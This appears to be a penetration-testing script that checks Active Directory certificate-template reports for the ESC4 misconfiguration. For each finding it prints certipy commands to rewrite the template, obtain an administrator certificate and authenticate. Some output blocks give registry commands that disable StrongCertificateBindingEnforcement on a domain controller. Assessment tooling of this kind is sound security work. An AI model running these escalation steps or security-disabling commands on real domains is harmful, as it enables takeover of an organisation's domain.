#!/usr/bin/env python3
"""
esc4.py — ESC4 vulnerability checker for oxs_cert JSON reports.
Usage: python3 esc4.py -f oxs_cert_XXXXXXXX.json

ESC4 — Template Misconfigured Access Control (ALL must be true):

  1. Template is NOT a CA template         (is_ca == False)
  2. Template is NOT a machine type        (is_machine_type == False)
  3. At least one non-admin principal has a write-capable right over the
     template object (ACL check):
       GenericAll    — full control, implies all rights below
       GenericWrite  — write any property
       WriteProperty — dangerous ONLY when scoped to an ESC4-relevant attribute
                        (msPKI-Certificate-Name-Flag / msPKI-Enrollment-Flag /
                        pKIExtendedKeyUsage) OR when object_type is empty (all
                        properties).  WriteProperty scoped to an unrelated
                        attribute is filtered to avoid false positives.
       WriteDACL     — modify DACL → attacker can self-grant any right
       WriteOwner    — take ownership → attacker can then grant WriteDACL
  4. That principal can also Enroll in the template (needed to request the
     final certificate after modifying the template to ESC1 conditions).
     If Enroll data is unavailable, the finding is flagged UNCERTAIN.

  Note on Enroll check (condition 4):
    ESC4 exploitation first MODIFIES the template (adding
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and Client Auth EKU), then requests
    a certificate.  Both the write right AND Enroll are therefore required
    on the same principal — or the attacker must have Enroll through a
    separate group membership.  Because verifying cross-SID group membership
    is outside the scope of static enumeration, this checker confirms that
    the write SID also holds Enroll (strict mode) or flags it as uncertain
    when only write rights are confirmed.

  ACL unknown:
    If ACL data is entirely missing, the template is flagged UNCERTAIN —
    manual verification required.

Exploitation flow (certipy):
  Step 1 — Save original template config and overwrite to ESC1-equivalent:
             certipy template ... -template <NAME> -save-old
  Step 2 — Request a certificate with a privileged UPN via SAN:
             certipy req   ... -template <NAME> -upn administrator@domain
  Step 3 — Authenticate with the resulting certificate:
             certipy auth  ... -pfx administrator.pfx
  Step 4 (optional) — Restore original template config:
             certipy template ... -template <NAME> -configuration <NAME>.json

Requires template_enumeration.py >= 1.3.0 with ESC4 fields applied:
  parsed["acl_enrollment_aces"]       — ACEs with Enroll / AutoEnroll rights
  parsed["acl_esc4_write_aces"]       — ACEs with ESC4-dangerous write rights
                                         (WriteProperty already filtered to
                                          ESC4-relevant attribute GUIDs by
                                          template_enumeration.py >= 1.3.1)
  parsed["acl_has_esc4_write_right"]  — True when any write ACE is present
"""

import argparse
import json
import sys
import uuid

# ── ESC4-dangerous write rights ───────────────────────────────────────────────

# Broad rights that are always ESC4-dangerous regardless of object-type scoping.
ESC4_BROAD_RIGHTS = {
    "GenericAll",
    "GenericWrite",
    "WriteDACL",
    "WriteOwner",
}

# WriteProperty is ESC4-dangerous only when scoped to one of these three
# attribute GUIDs (bytes_le / COM mixed-endian, stored as hex strings in the
# ACE object_type field produced by template_enumeration.py >= 1.3.1).
# An empty object_type means the ACE applies to ALL properties → also dangerous.
#
#   ea1dddc4-60ff-416e-8cc0-17cee534bce7  msPKI-Certificate-Name-Flag
#   d15ef7d8-f226-46db-ae79-b34e560bd12c  msPKI-Enrollment-Flag
#   18976af7-7b89-4f5e-89a4-2d4b8e9e8a8d  pKIExtendedKeyUsage
ESC4_WP_GUIDS = {
    uuid.UUID("ea1dddc4-60ff-416e-8cc0-17cee534bce7").bytes_le.hex(),
    uuid.UUID("d15ef7d8-f226-46db-ae79-b34e560bd12c").bytes_le.hex(),
    uuid.UUID("18976af7-7b89-4f5e-89a4-2d4b8e9e8a8d").bytes_le.hex(),
}

# ── Known admin-only SIDs (mirrored from esc3.py) ────────────────────────────

ADMIN_SIDS = {
    "S-1-5-32-544",         # BUILTIN\Administrators
    "S-1-5-18",             # SYSTEM
}

ADMIN_SID_SUFFIXES = [
    "-512",  # Domain Admins
    "-519",  # Enterprise Admins
    "-516",  # Domain Controllers
]


# ── Args ──────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="ESC4 checker for oxs_cert JSON reports",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("-f", "--file", metavar="FILE", required=True,
                   help="Path to oxs_cert JSON report")
    p.add_argument("--skip-acl", action="store_true",
                   help="Skip ACL check (use if ACL data is unavailable)")
    p.add_argument("--verbose-skip", action="store_true",
                   help="Print why each non-qualifying template was skipped")
    return p.parse_args()


def load_report(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"[!] File not found: {path}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"[!] Invalid JSON: {e}")
        sys.exit(1)


# ── Helpers ───────────────────────────────────────────────────────────────────

def is_admin_sid(sid):
    if sid in ADMIN_SIDS:
        return True
    return any(sid.endswith(s) for s in ADMIN_SID_SUFFIXES)


def _ace_rights(ace):
    """Return the set of right names from an ACE.

    Supports both the new `rights` list (template_enumeration >= 1.3.0 + ESC4
    patch) and the legacy single `right` string for older reports.
    """
    rights_list = ace.get("rights")
    if rights_list and isinstance(rights_list, list):
        return set(rights_list)
    # Fallback: legacy single-string field
    single = ace.get("right")
    if single:
        return {single}
    return set()


def _ace_has_write(ace):
    """True if the ACE carries at least one ESC4-dangerous write right.

    Broad rights (GenericAll, GenericWrite, WriteDACL, WriteOwner) are always
    dangerous regardless of object-type scoping.

    WriteProperty is dangerous only when:
      - object_type is absent or empty  → ACE applies to ALL properties
      - object_type matches one of the three ESC4-relevant attribute GUIDs
        (msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag, pKIExtendedKeyUsage)

    WriteProperty scoped to any other GUID (e.g. description, displayName) is
    filtered out here to avoid false positives on non-exploitable ACEs.

    This function is used only for the legacy fallback path (pre-1.3.1 reports
    where acl_esc4_write_aces is absent).  For reports produced by
    template_enumeration.py >= 1.3.1 the filtering is already done by the
    enumerator and acl_esc4_write_aces contains only dangerous ACEs.
    """
    rights = _ace_rights(ace)
    if ESC4_BROAD_RIGHTS & rights:
        return True
    if "WriteProperty" in rights:
        obj_type = ace.get("object_type", "")
        return obj_type == "" or obj_type in ESC4_WP_GUIDS
    return False


def _ace_has_enroll(ace):
    """True if the ACE carries an Enroll or AutoEnroll right."""
    rights = _ace_rights(ace)
    mask_str = ace.get("mask", "0x0")
    try:
        mask_int = int(mask_str, 16)
    except (ValueError, TypeError):
        mask_int = 0
    return (
        "Enroll"     in rights or
        "AutoEnroll" in rights or
        "GenericAll" in rights or         # GenericAll implies Enroll
        (mask_int & 0x10000000) != 0 or   # GENERIC_ALL mask
        (mask_int & 0x100) != 0           # RIGHT_DS_CONTROL_ACCESS (Enroll extended right)
    )


def has_non_admin_write(aces):
    """Returns (True, sid, rights_found) if at least one non-admin principal
    holds an ESC4-dangerous write right.

    Deny ACEs are evaluated first — an explicit Deny for a SID cancels
    any Allow for the same SID, matching AD's ACE evaluation order.
    Only Deny ACEs that cover the specific write right being checked are
    counted (a Deny-Enroll does not block a WriteProperty Allow).
    """
    # Collect SIDs with an explicit Deny on a write right
    denied_write_sids = set()
    for ace in aces:
        if ace.get("type") != "Deny":
            continue
        if _ace_has_write(ace):
            denied_write_sids.add(ace.get("sid", ""))

    for ace in aces:
        if ace.get("type") != "Allow":
            continue
        sid = ace.get("sid", "")
        if is_admin_sid(sid) or sid in denied_write_sids:
            continue
        if _ace_has_write(ace):
            # Collect the specific dangerous rights this ACE carries for reporting.
            # For WriteProperty we include it only when _ace_has_write already
            # confirmed it is scoped to an ESC4-relevant attribute (or all props).
            all_dangerous = ESC4_BROAD_RIGHTS | {"WriteProperty"}
            rights_found = sorted(all_dangerous & _ace_rights(ace))
            return True, sid, rights_found

    return False, None, []


def has_non_admin_enroll(aces):
    """Returns (True, sid) if at least one non-admin has Enroll right.
    Mirrors esc3.py logic exactly.
    """
    denied_sids = set()
    for ace in aces:
        if ace.get("type") != "Deny":
            continue
        if _ace_has_enroll(ace):
            denied_sids.add(ace.get("sid", ""))

    for ace in aces:
        if ace.get("type") != "Allow":
            continue
        sid = ace.get("sid", "")
        if is_admin_sid(sid) or sid in denied_sids:
            continue
        if _ace_has_enroll(ace):
            return True, sid

    return False, None


# ── Core ESC4 check ───────────────────────────────────────────────────────────

def check_esc4(template, skip_acl=False):
    """
    Returns (qualifies, reasons_failed, acl_unknown, write_sid, write_rights, enroll_sid)

    qualifies    = True  → template is confirmed ESC4-vulnerable
    acl_unknown  = True  → conditions passed but ACL data was missing or
                           Enroll could not be verified for the write principal
    write_sid    = SID of the principal with the dangerous write right (or None)
    write_rights = list of specific write rights that SID holds
    enroll_sid   = SID that holds Enroll (may differ from write_sid)
    """
    parsed = template.get("parsed", {})

    failed      = []
    acl_unknown = False
    write_sid   = None
    write_rights = []
    enroll_sid  = None

    # ── Filter 1: CA templates ────────────────────────────────────────────────
    if parsed.get("is_ca", False):
        failed.append("CA template (is_ca=True)")
        return False, failed, acl_unknown, None, [], None

    # ── Filter 2: Machine-type templates ─────────────────────────────────────
    if parsed.get("is_machine_type", False):
        failed.append("Machine-type template (is_machine_type=True)")
        return False, failed, acl_unknown, None, [], None

    # ── Condition: Non-admin has ESC4-dangerous write right ───────────────────
    if not skip_acl:

        # Prefer the pre-computed ESC4 ACE list; fall back to full ACE list.
        # acl_esc4_write_aces is populated by template_enumeration >= 1.3.0
        # with the ESC4 patch.  For older reports both lists may be identical
        # (all ACEs) or write_aces may be missing entirely.
        write_aces  = parsed.get("acl_esc4_write_aces")
        all_aces    = parsed.get("acl_enrollment_aces", [])

        if write_aces is None:
            # Pre-ESC4-patch report: derive write ACEs from full ACE list
            write_aces = [a for a in all_aces if _ace_has_write(a)]

        if write_aces:
            non_admin_write, write_sid, write_rights = has_non_admin_write(write_aces)
            if not non_admin_write:
                failed.append("No non-admin principal has a write right over the template")
        elif all_aces:
            # Full ACE list present but no write rights found
            failed.append("No non-admin principal has a write right over the template")
        else:
            # No ACL data at all
            acl_unknown = True
            failed.append("ACL data missing — write rights unconfirmed")

        # ── Condition: Write SID can also Enroll ─────────────────────────────
        # Skip this check if the write right already implies it (GenericAll),
        # or if we have no write_sid to check against.
        if write_sid and "GenericAll" not in write_rights:
            non_admin_enroll, enroll_sid = has_non_admin_enroll(all_aces)
            if not non_admin_enroll:
                # Write right confirmed but Enroll not found on any non-admin —
                # still flag as uncertain rather than clean; attacker may hold
                # Enroll through group membership not visible in this snapshot.
                acl_unknown = True
                failed.append(
                    "Write right confirmed but Enroll not found for any non-admin "
                    "— verify group membership manually"
                )
        elif write_sid and "GenericAll" in write_rights:
            # GenericAll implies Enroll — set enroll_sid same as write_sid
            enroll_sid = write_sid

    # Strip the ACL-missing message before returning so it is not counted as a
    # hard failure (mirrors esc3.py logic for acl_unknown handling).
    qualifies = len(failed) == 0
    for msg in [
        "ACL data missing — write rights unconfirmed",
        "Write right confirmed but Enroll not found for any non-admin "
        "— verify group membership manually",
    ]:
        if acl_unknown and msg in failed:
            failed.remove(msg)

    return qualifies, failed, acl_unknown, write_sid, write_rights, enroll_sid


# ── Output ────────────────────────────────────────────────────────────────────

def _eku_str(template):
    parsed = template.get("parsed", {})
    ekus   = parsed.get("eku_friendly", [])
    if parsed.get("eku_is_empty", not ekus):
        return "none (Any Purpose — empty EKU)"
    return ", ".join(e["name"] + " (" + e["oid"] + ")" for e in ekus)


def print_finding(template, write_sid, write_rights, enroll_sid,
                  acl_unknown=False):
    raw    = template.get("raw", {})
    parsed = template.get("parsed", {})

    cn           = raw.get("cn", "N/A")
    display_name = raw.get("displayName", "N/A")
    dn           = template.get("dn", "N/A")
    schema_ver   = raw.get("msPKI-Template-Schema-Version", "N/A")
    validity     = parsed.get("validity_period", "unknown")
    enroll_flags = parsed.get("enrollment_flags_decoded", [])
    key_size     = raw.get("msPKI-Minimal-Key-Size", "N/A")

    rights_str   = ", ".join(write_rights) if write_rights else "N/A"

    print(f"  Template     : {cn} ({display_name})")
    print(f"  DN           : {dn}")
    print(f"  Schema       : {schema_ver}  |  Validity: {validity}  |  Key: {key_size} bit")
    print(f"  EKU          : {_eku_str(template)}")
    print(f"  Enroll Flags : {', '.join(enroll_flags) if enroll_flags else 'none'}")
    print(f"  Write SID    : {write_sid or 'N/A'}")
    print(f"  Write Rights : {rights_str}")
    if enroll_sid and enroll_sid != write_sid:
        print(f"  Enroll SID   : {enroll_sid}")
    elif enroll_sid and enroll_sid == write_sid:
        print(f"  Enroll SID   : {enroll_sid}  (same as write SID)")
    if acl_unknown:
        print(f"  ACL          : [!] Incomplete ACL data — verify manually")


def print_exploit(template, strong_binding_val=None):
    cn = template.get("raw", {}).get("cn", "?")
    print("  Exploit (certipy):")
    print(f"    Step 1 — Modify template to ESC1-equivalent:")
    print(f"             certipy-ad template -u USER@DOMAIN -p PASS -dc-ip <DC-IP> \\")
    print(f"                 -template '{cn}'")
    print(f"             # Note: -save-old removed in certipy v5 — backup template manually")
    print(f"    Step 2 — Request certificate with privileged UPN:")
    print(f"             certipy-ad req -u USER@DOMAIN -p PASS -dc-ip <DC-IP> \\")
    print(f"                 -target <CA-HOST> -ca '<CA-NAME>' -template '{cn}' \\")
    print(f"                 -upn 'administrator@DOMAIN'")
    print(f"    Step 3 — Authenticate:")
    print(f"             certipy-ad auth -pfx administrator.pfx \\")
    print(f"                 -username administrator -domain DOMAIN -dc-ip <DC-IP>")
    print(f"    Step 4 — Restore template (lab cleanup):")
    print(f"             # Manually restore via ADUC or re-run lab setup script")

    # StrongCertificateBindingEnforcement warning
    if strong_binding_val is None:
        print()
        print("  [!] StrongCertificateBindingEnforcement unknown.")
        print("      If auth fails with 'Object SID mismatch', set to 0 on DC:")
        print("      reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")
    elif int(strong_binding_val) == 0:
        print()
        print("  [+] StrongCertificateBindingEnforcement = 0 (Disabled) — auth should succeed.")
    elif int(strong_binding_val) == 1:
        print()
        print("  [!] StrongCertificateBindingEnforcement = 1 (Compatibility mode).")
        print("      Auth may succeed on unpatched DCs. If it fails, set to 0:")
        print("      reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")
    else:
        print()
        print(f"  [-] StrongCertificateBindingEnforcement = {strong_binding_val} (Full Enforcement).")
        print("      Auth WILL be blocked. Set to 0 on DC before exploiting:")
        print("      reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")


# ── Main ──────────────────────────────────────────────────────────────────────

def _strong_binding_label(val):
    """Return a human-readable label for StrongCertificateBindingEnforcement."""
    if val is None:
        return None
    mapping = {
        0: "Disabled",
        1: "Compatibility mode",
        2: "Full Enforcement",
    }
    return mapping.get(int(val), f"Unknown ({val})")


def _infer_default_binding(os_name, os_version):
    """
    Infer the likely DEFAULT StrongCertificateBindingEnforcement value
    based on OS version when the registry key is absent.

    Returns (inferred_value, confidence, explanation).
    """
    os_name    = (os_name    or "").lower()
    os_version = (os_version or "").lower()

    # Windows Server 2025: build 26100+
    if "2025" in os_name:
        return 2, "high", "Server 2025 default is 2 (Full Enforcement)"

    # Windows Server 2022: build 20348
    if "2022" in os_name or "20348" in os_version:
        return 1, "medium", (
            "Server 2022 default is 1 (Compatibility). "
            "May be 2 if KB5014754 + May 2025 patch applied."
        )

    # Windows Server 2019: build 17763
    if "2019" in os_name or "17763" in os_version:
        return 1, "medium", (
            "Server 2019 default is 1 (Compatibility). "
            "May be 2 if KB5014754 + May 2025 patch applied."
        )

    # Windows Server 2016: build 14393
    if "2016" in os_name or "14393" in os_version:
        return 0, "high", "Server 2016 default is 0 (Disabled)"

    # Earlier / unknown
    return 0, "low", "Unknown OS — cannot infer default reliably"


def _print_strong_binding(scan):
    """Print StrongCertificateBindingEnforcement status from scan_info."""
    sb       = scan.get("kdc_strong_certificate_binding", {})
    val      = sb.get("value")
    source   = sb.get("source", "not_collected")
    os_name  = sb.get("os_name",    sb.get("os_hint", ""))
    os_ver   = sb.get("os_version", "")
    dfl      = sb.get("dfl")
    note     = sb.get("note", "")

    print("[*] KDC StrongCertificateBindingEnforcement")

    if source == "not_collected":
        print("    Status  : Not collected — re-run template_enumeration.py >= 1.4.1")
        print("    Manual  : reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("              /v StrongCertificateBindingEnforcement")
        return

    # Registry value not readable via LDAP — show OS-based inference
    if val is None:
        print("    Value   : Cannot be read via LDAP (registry key)")
        if os_name:
            print(f"    OS      : {os_name}" + (f"  ({os_ver})" if os_ver else ""))
        if dfl is not None:
            print(f"    DFL     : {dfl}")

        inferred, confidence, explanation = _infer_default_binding(os_name, os_ver)
        label = {0: "Disabled", 1: "Compatibility mode", 2: "Full Enforcement"}.get(inferred, str(inferred))
        print(f"    Inferred: {inferred} ({label})  [confidence: {confidence}]")
        print(f"    Reason  : {explanation}")

        if inferred == 0:
            print("    Impact  : [LIKELY VULNERABLE] ESC4 auth should succeed")
        elif inferred == 1:
            print("    Impact  : [POTENTIALLY VULNERABLE] auth may succeed — verify manually")
        else:
            print("    Impact  : [LIKELY MITIGATED] auth will be blocked unless value set to 0")

        print()
        print("    Manual check on DC:")
        print("      reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("          /v StrongCertificateBindingEnforcement")
        print()
        print("    To disable for lab (if needed):")
        print("      reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")
        return

    # Registry value known
    val_int = int(val)
    label   = _strong_binding_label(val_int)

    if val_int == 0:
        status = "[VULNERABLE] Disabled — ESC4 auth will succeed"
    elif val_int == 1:
        status = "[POTENTIALLY VULNERABLE] Compatibility mode — may succeed on unpatched DCs"
    else:
        status = "[MITIGATED] Full Enforcement — ESC4 auth will be blocked"

    print(f"    Value   : {val_int} ({label})")
    if os_name:
        print(f"    OS      : {os_name}" + (f"  ({os_ver})" if os_ver else ""))
    if dfl is not None:
        print(f"    DFL     : {dfl}")
    print(f"    Status  : {status}")

    if val_int != 0:
        print()
        print("    To disable for lab:")
        print("      reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")


def main():
    args   = parse_args()
    report = load_report(args.file)

    scan   = report.get("scan_info", {})
    domain = scan.get("domain", "N/A")
    dc_ip  = scan.get("dc_ip", "N/A")
    user   = scan.get("user", "N/A")

    print(f"[*] Report    : {report.get('report_id', 'N/A')}")
    print(f"[*] Domain    : {domain}")
    print(f"[*] DC IP     : {dc_ip}")
    print(f"[*] User      : {user}")
    print()

    _print_strong_binding(scan)
    print()

    sb      = scan.get("kdc_strong_certificate_binding", {})
    sb_val  = sb.get("value")
    sb_os   = sb.get("os_name", sb.get("os_hint", ""))
    sb_osv  = sb.get("os_version", "")

    # If value unknown, infer from OS
    if sb_val is None and (sb_os or sb_osv):
        sb_val_inferred, _, _ = _infer_default_binding(sb_os, sb_osv)
    else:
        sb_val_inferred = sb_val

    templates = report.get("templates", [])

    # ── Classify every template ───────────────────────────────────────────────
    findings_vulnerable = []   # (template, write_sid, write_rights, enroll_sid)
    findings_unknown    = []   # (template, write_sid, write_rights, enroll_sid)
    skipped             = []   # (template, reasons)

    for t in templates:
        qualifies, failed, acl_unknown, write_sid, write_rights, enroll_sid = \
            check_esc4(t, skip_acl=args.skip_acl)

        if qualifies:
            findings_vulnerable.append((t, write_sid, write_rights, enroll_sid))
        elif acl_unknown and len(failed) == 0:
            findings_unknown.append((t, write_sid, write_rights, enroll_sid))
        else:
            skipped.append((t, failed))

    # ── Vulnerable findings ───────────────────────────────────────────────────
    if findings_vulnerable:
        print(f"[!] ESC4 found — {len(findings_vulnerable)} vulnerable template(s)\n")
        print("=" * 60)
        for i, (t, ws, wr, es) in enumerate(findings_vulnerable, 1):
            print(f"Finding {i} of {len(findings_vulnerable)}")
            print("-" * 60)
            print_finding(t, ws, wr, es, acl_unknown=False)
            print()
            print_exploit(t, strong_binding_val=sb_val_inferred)
            print("=" * 60)
    else:
        print("[+] No ESC4 vulnerable templates found.")

    # -- Uncertain findings ---
    if findings_unknown:
        print(
            f"\n[?] {len(findings_unknown)} uncertain template(s) — "
            f"write right found but ACL data incomplete (verify manually):\n"
        )
        print("=" * 60)
        for i, (t, ws, wr, es) in enumerate(findings_unknown, 1):
            print(f"Finding {i} of {len(findings_unknown)}")
            print("-" * 60)
            print_finding(t, ws, wr, es, acl_unknown=True)
            print()
            print_exploit(t, strong_binding_val=sb_val_inferred)
            print("=" * 60)

    # ── Verbose skip ──────────────────────────────────────────────────────────
    if args.verbose_skip:
        if skipped:
            print(f"\n[*] Templates that did not qualify ({len(skipped)}):")
            for t, reasons in skipped:
                cn = t.get("raw", {}).get("cn", "?")
                print(f"  - {cn}: {'; '.join(sorted(reasons))}")

    # ── Summary ───────────────────────────────────────────────────────────────
    print()
    print(
        f"[*] {len(templates)} templates checked  |  "
        f"{len(findings_vulnerable)} vulnerable  |  "
        f"{len(findings_unknown)} uncertain  |  "
        f"{len(skipped)} clean"
    )


if __name__ == "__main__":
    main()